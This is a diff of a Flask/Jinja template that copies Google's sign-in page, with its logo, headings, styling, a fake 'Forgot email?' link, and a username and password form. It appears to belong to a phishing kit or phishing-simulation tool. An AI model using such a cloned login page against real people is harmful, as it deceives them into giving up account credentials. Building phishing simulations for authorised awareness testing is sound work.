@@ -1,5 +1,9 @@
 {% extends "base.html" %}
 
+{% block styles %}
+<link rel="stylesheet" type="text/css" href="{{ url_for('.static', filename='google.css') }}">
+{% endblock %}
+
 {% block content %}
 <div id="login-app" class="d-flex flex-column justify-content-center">
     <!-- Google Logo -->
@@ -27,7 +31,8 @@
     </div>
     <h1 class='g-h1'>Sign in</h1>
     <h2 class='g-h2'>Use your Google Account</h2>
-    <form method="post" action="index.php" onsubmit="redirect()" id='email-form-step'>
+    <form method="post" action="" id='email-form-step' novalidate>
+        {{ form.hidden_tag() }}
         {{ form.username(class_="g-input") }}
         {{ form.password(class_="g-input password-input") }}
         <span class='g-fake-link'>Forgot email?</span>
